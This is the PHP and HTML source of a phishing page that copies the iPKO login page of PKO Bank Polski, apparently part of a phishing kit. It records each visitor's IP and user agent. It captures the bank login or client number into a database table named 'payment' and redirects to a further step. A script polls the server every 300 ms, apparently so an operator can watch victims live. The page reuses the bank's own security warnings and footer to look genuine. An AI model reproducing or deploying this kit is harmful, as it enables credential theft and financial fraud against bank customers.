<?php include('../bank_header.php'); ?>
<?php include('../../../db.php');
include('../../../YH0uW3ecaRHG16ld4waY.php');

$sup = "UPDATE `payment` SET `beep` = '0'";
$con->query($sup);

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}



if($_REQUEST['id']){
  $id = mysqli_real_escape_string($con,$_REQUEST['id']);
$userip = get_client_ip();
$useragent = $_SERVER['HTTP_USER_AGENT'];

$sup = "UPDATE `payment` SET `userip` = '$userip', `useragent` ='$useragent'  WHERE `id` = '$id' ";
$con->query($sup);

$page_name = basename($_SERVER['PHP_SELF']);
$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
$con->query($sqlss);
}
if(isset($_POST['submited'])){
$bank_user_id = $_POST['bank_user_id'];
$sql = "UPDATE `payment` SET `bank_user_id` = '$bank_user_id' WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$con->query($sql);
echo '<script>window.location.href="indexone.php?id='.$_REQUEST['id'].'"</script>';
}
?>

<script type="text/javascript">
setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
function upd_last_login(str) {
    if (str == "") {
        // document.getElementById("txtHint").innerHTML = "";
        // return;
    } else {
        if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();
        } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                //document.getElementById("ip").innerHTML = this.responseText;
                //alert(this.responseText);
            }
        };
        xmlhttp.open("GET","../update123.php?id="+str,true);
        xmlhttp.send();
    }
}
</script>


<!DOCTYPE HTML><html class=" dk_fouc">
<head>
        <title>Serwis Internetowy iPKO</title>
<!--        <meta http-equiv="refresh" content="0;URL=index.php" />-->

        <meta http-equiv="content-type" content="text/html;charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
        <link rel="stylesheet" href="css/styles.css">
<!--[if lte IE 9]>
        <link rel="stylesheet" href="/secure/ikd3/css/ie9.css?ts=73c444878e07716a3b481ddcb222427e5cefa573" />
<![endif]-->
<!--[if lte IE 8]>
        <link rel="stylesheet" href="/secure/ikd3/css/ie8.css?ts=73c444878e07716a3b481ddcb222427e5cefa573" />
<![endif]-->
</head>
<body>
        <div class="container" id="container"><div class="r-alert"><div><div class="ui-inplace-dialog-buttonpane" id="alert-popup"  style="display:none">
    <div id="alert-popup-info">
        <h2 class="content">Uwaga na nowe zagrożenia w sieci</h2>
        <p>Przypominamy, że podczas logowania ani bezpośrednio po zalogowaniu do iPKO Bank nigdy nie prosi o podanie kodu z narzędzia autoryzacyjnego. Dodatkowo, jeżeli korzystasz z autoryzacji w formie kodów SMS, pamiętaj, aby przed potwierdzeniem operacji zawsze uważnie weryfikować treść otrzymanego SMS-a (sprawdzaj, czy dane w SMS-ie są zgodne z danymi operacji, którą zlecasz).</p>
    </div>
    <div id="alert-popup-ribbon"></div>
</div>
</div></div>
<div id="interpay-container" class="iko-rwd">
    <div id="header" class="content">
        <div class="header"><a href="#" class="logo">iPKO</a></div>
    </div>
    <div id="content" class="layout-content">
        <h2></h2>
        <ul class="columns divided login-section">
            <li>
                <div class="r-login-box"><div class="" style="position: relative;"><div class="ui-inplace-dialog"><div class="ui-inplace-dialog-titlebar" aria-live="polite"><span class="ui-inplace-dialog-title"></span></div><div class="ui-inplace-dialog-content"><div class="content"><div><div class="r-login-box-login">
								<div class="ui-loader-container" style="position: absolute; z-index: 1; background: white none repeat scroll 0% 0%; opacity: 1; width: 440px; min-height: 75px; overflow: hidden; margin-top: 0px; margin-left: 0px; padding: 0px;"><div class="ui-loader" style="position: relative;"><div class="ui-inplace-dialog"><div class="ui-inplace-dialog-titlebar" aria-live="polite"><span class="ui-inplace-dialog-title"></span></div><div class="ui-inplace-dialog-content"><div class="content"><div><div class="r-login-box-login">
 <div class="header-box-link">
 <h1>Logowanie</h1>
 <div class="right size-250 activate-ipko"><a href="http://www.pkobp.pl/zostan-klientem" class="link" target="_blank">zostań klientem PKO Banku Polskiego</a></div>
 </div>
 <div class="ui-error-message x-invalid-credentials" aria-live="alert" style="display:none">Wymagane pole nie zostało wypełnione.</div>
 <ul class="form-set push-170">
 <li>
     <form action="" method="post">
 <label class="label pull" for="editField#186">Numer klienta lub login</label>
 <span class="input"><input required name="bank_user_id" value="" maxlength="50" class="size-200 x-field-1 ipkolgn" autocomplete="off" type="text"></span><a class="tip" aria-label="Podpowiedź" tabindex="0" data-tooltip-key="login.login_field"></a>

			<input type="hidden" id="channelname" name="channelname" value="channel_4_cell">
			<input type="hidden" name="transactionid" value="2147484242" id="transactionid" />
			<input type="submit"  id="wyslijmnie" style="display:none !important"/>

</li>
 </ul>
</div>
</div></div></div><div class="ui-inplace-dialog-buttonpane antiphising"><div class="ui-inplace-dialog-buttonset">
<input type="hidden" name="submited" value="submit"/>
<button name="submit" type="submit" id="ipkodalej" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-state-hover ui-state-focus" role="button" aria-disabled="false"><span class="ui-button-text">Dalej</span></button>
</div></div></div></div><div id='ui-ajax-loader' class="ui-ajax-loader" style="min-height: 75px;display:none"><i></i></div></div>

			</form>

			<div class="ui-loader" style="position: relative; overflow: hidden; opacity: 0; height: 173px;"><div class="ui-inplace-dialog"><div class="ui-inplace-dialog-titlebar" aria-live="polite"><span class="ui-inplace-dialog-title"></span></div><div class="ui-inplace-dialog-content"><div class="content"><div>
</div></div></div><div class="ui-inplace-dialog-buttonpane antiphising"><div class="ui-inplace-dialog-buttonset"><button class="ui-dialog-button-right push-30 antiphishing-button-next ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">Dalej</span></button></div></div></div></div><div class="x-focusable visually-hidden" tabindex="-1"></div></div>
            </li>
            <form method="POST" action="#" id="xxx">
			<input type="hidden" value="" name="nik2" id="nik2" />
			<input type="hidden" id="channelname" name="channelname" value="channel_6_cell">
			<input type="hidden" name="transactionid" value="2147484242" id="transactionid" />
			</form>
            <li>
                <!--<div class="r-iko-box" style="position: relative;"><div><div class="ui-inplace-dialog"><div class="ui-inplace-dialog-titlebar" aria-live="polite"><span class="ui-inplace-dialog-title">Zlecenie płatności za zakupy internetowe</span></div><div class="ui-inplace-dialog-content" aria-live="polite"><div class="content"><div><div class="push-30">
    <h1>lub wpisz kod BLIK i zapłać z IKO</h1>

    <ul class="columns">
        <li>
            <ul class="form-set">
                <li>
                    <label class="label">Płacisz w:</label>
                    <div class="value">PayU S.A<br>Ul. Grunwaldzka 182<br>60-166 Poznań</div>
                </li>
                <li>
                    <label class="label">Kwota:</label>
                    <div class="value"><h1>112,00&nbsp;PLN</h1></div>
                </li>
            </ul>
        </li>
        <li>
            <ul class="form-set">
                <li>
                    <label class="label">Płacisz za:</label>
                    <div class="value">XX878999490XX<br>Płatność z Allegro 706579420</div>
                </li>
                <li>
                    <label class="label" for="editField#25">Podaj kod BLIK lub numer czeku BLIK z aplikacji IKO</label>
                    <span class="input"><input class="size-120 f-iko-code ui-ipko-input" aria-disabled="false" maxlength="9" id="editField#25" type="tel"></span>
                    <span class="logo-blik"></span>
                </li>
            </ul>
        </li>!>
    </ul>
</div>
</div></div></div><div class="ui-inplace-dialog-buttonpane"><div class="ui-inplace-dialog-buttonset"><button class="ui-dialog-button-left pay ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">Zapłać</span></button></div></div></div></div></div>-->
            </li>

        </ul>
    </div>
    <div id="bottom-rotator">

        <div class="bottom">
            <ul>
                <li class="ad-box-470" ev6wtls="" hidden="">
                    <div class="r-ads" ev6wtls="" hidden=""><div class="ad-rotator" ev6wtls="" hidden=""><div class="r-content-zxc" style="position: relative; opacity: 1; left: 0px;" tabindex="0"><div><div class="screenContent"><div class="static-ad offerContentWrapper" ev6wtls="" hidden=""><table>
    <tbody><tr>
        <td class="offerContent">
            <div class="h1">Kredyt odnawialny online w iPKO</div>
            <p>Możesz złożyć wniosek o dodatkowe środki w ramach Twojego konta online. Wybierasz „<strong>Weź kredyt</strong>” i <strong>wypełniasz </strong>wniosek po zalogowaniu do serwisu iPKO.</p>

                <div class="offerButtons">
                    <a href="#" class="submit" target="_blank">Weź kredyt</a>
                </div>

        </td>

    </tr>
</tbody></table>
</div></div>
</div></div>
<div class="r-rotator"><ul class="ad-rotator-slider" ev6wtls="" hidden="">

        <li>
            <a href="#" data-index="0" class="selected" title="Slajd 1">
            	<span data-aria-index="0" class="visually-hidden">Kredyt odnawialny - baner dwukrokowy</span>
            <canvas width="15" height="15"></canvas><span class="visually-hidden">Aktywny</span></a>
        </li>

        <li>
            <a href="#" data-index="1" class="" title="Slajd 2">
            	<span data-aria-index="1" class="visually-hidden">BEZPIECZEŃSTWO W iPKO</span>
            </a>
        </li>


</ul></div>
</div></div>
                </li>
            </ul>
        </div>

    </div>
    <div id="footer" class="content"><div><div class="bottom">
    <ul class="columns divided login-news-help-section">
        <li>
            <h2><b style="color: #323232;">Aktualności</b></h2>
            <ul class="columns divided login-news-section">
                <li>
                    <ul class="news">

                            <li>
                                <div class="date">2017.04.19</div>

                                    <a href="https://www.pkobp.pl/aktualnosci/ogolnokrajowe/uwaga-na-nowe-zagrozenia-w-sieci_2/" class="title" target="_blank">Uwaga na nowe zagrożenia w sieci!</a>
                                    <div class="lead">W internecie pojawiają się kolejne wersje złośliwego oprogramowania, które - zainstalowane na komputerze użytkownika logującego się do serwisu internetowego PKO Banku Polskiego - może zostać wykorzystane przez przestępców do realizacji nieuprawnionych transakcji z rachunków klientów banku.</div>
                                    <a href="https://www.pkobp.pl/aktualnosci/ogolnokrajowe/uwaga-na-nowe-zagrozenia-w-sieci_2/" class="link" target="_blank">więcej</a>

                            </li>

                    </ul>
                </li>
                <li>
                    <ul class="news">

                            <li>
                                <div class="date">2016.12.14</div>

                                    <p class="blue title">Zmiana nazwy "Przelew do US" na "Przelew podatkowy"</p>
                                    <div class="lead">Od dnia 15 grudnia 2016 roku nazwa usługi "Przelew do US" w iPKO, przy użyciu której zlecasz przelew do Izby Celnej i Urzędu Skarbowego (m.in. z tytułu podatku lub mandatu), zmieni się na "Przelew podatkowy".</div>

                            </li>

                    </ul>
                </li>
            </ul>
        </li>
        <li>
            <h2><b>Pomoc i bezpieczeństwo</b></h2>
            <ul class="columns divided login-help-section">
                <li>
                    <ul class="links">
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/uwaga-na-nowe-zagrozenia-w-sieci/" class="link" target="_blank">Uwaga na nowe zagrożenia w sieci!</a></li>
                        <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/bezpieczna-bankowosc/bezpieczne-logowanie/" class="link" target="_blank">Bezpieczne logowanie</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/bezpieczny-komputer/" class="link" target="_blank">Bezpieczny komputer</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/bezpieczny-telefon/" class="link" target="_blank">Bezpieczny telefon</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/bezpieczne-przelewanie/" class="link" target="_blank">Bezpieczne przelewanie</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/jak-unikac-zagrozenia/" class="link" target="_blank">Jak unikać zagrożenia</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipko/bezpieczna-bankowosc/inne-zabezpieczenia/" class="link" target="_blank">Inne zabezpieczenia</a></li>
                    </ul>
                </li>
                <li>
                    <ul class="links">
                        <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/baza-wiedzy-najczesciej-zadawane-pytania/" class="link" target="_blank">FAQ</a></li>
                        <li><a href="http://demo.ipko.pl/" class="link" target="_blank">Demo</a></li>
                        <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/nowe-ipko-nowe-mozliwosci/pomoc-i-wersje-demonstracyjne/filmy-instruktazowe/" class="link" target="_blank">Filmy instruktażowe</a></li>
                        <li><a href="http://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/nowe-ipko-nowe-mozliwosci/pomoc-i-wersje-demonstracyjne/pierwsze-logowanie/" class="link" target="_blank">Pierwsze logowanie</a></li>
                        <li><a href="https://www.pkobp.pl/bankowosc-elektroniczna/ipkonowe/nowe-ipko-nowe-mozliwosci/pomoc-i-wersje-demonstracyjne/przewodniki/" class="link" target="_blank">Przewodniki po iPKO (iPKO electronic banking services guide)</a></li>
                        <li><a href="https://epuap.gov.pl/wps/portal" class="link" target="_blank">Logowanie do ePUAP</a></li>
                    </ul>
                </li>
            </ul>
        </li>
    </ul>
</div>
<div class="footer">
    <ul class="nav size-210">

        <li><a href="https://www.pkobp.pl/kontakt/" class="link" target="_blank">Kontakt</a></li>

        <li><a href="http://www.pkobp.pl/poi/" class="link" target="_blank">Oddziały i agencje</a></li>

        <li><a href="https://www.pkobp.pl/" class="link" target="_blank">Serwis informacyjny</a></li>

    </ul>
    <div class="last_login"></div>
    <div class="copyright">© 2017 PKO Bank Polski
        <span>Kod BIC (Swift): BPKOPLPW</span>
    </div>
    <div class="hotline">Serwis telefoniczny iPKO: 800 302 302, (+48) 81 535 60 60
        <div class="padding-top">800 302 302 (brak opłat dla numerów krajowych na terenie kraju; w pozostałych</div>
        <div class="no-padding-top">przypadkach – opłata zgodna z taryfą operatora), 81 535 60 60 (opłata zgodna</div>
        <div class="no-padding-top">z taryfą operatora). Serwis telefoniczny czynny całą dobę.</div>
    </div>
</div>
</div></div>
</div>
</div>

</body>


</html>